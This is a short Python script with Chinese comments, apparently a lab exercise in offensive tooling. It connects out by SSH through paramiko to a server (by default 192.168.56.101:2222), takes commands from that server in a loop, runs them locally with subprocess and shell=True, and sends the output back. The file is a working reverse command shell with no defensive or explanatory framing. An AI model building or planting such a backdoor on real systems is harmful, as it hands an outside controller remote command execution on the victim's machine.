import paramiko
import subprocess
import shlex
import getpass


def ssh_command(ip,port,user,passwd,command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,port,user,passwd)
    

    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        # 从ssh不断读取数据
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                #本地执行
                cmd_output = subprocess.check_output(shlex.split(cmd),shell=True)
                # 将结果发回服务器
                ssh_session.send(cmd_output or 'ok')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    user = input('Username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ') or '192.168.56.101'
    port = input('Enter port or <CR>: ') or 2222
    cmd = input('Enter command or <CR>: ') or 'id'
    ssh_command(ip,port,user,password,cmd)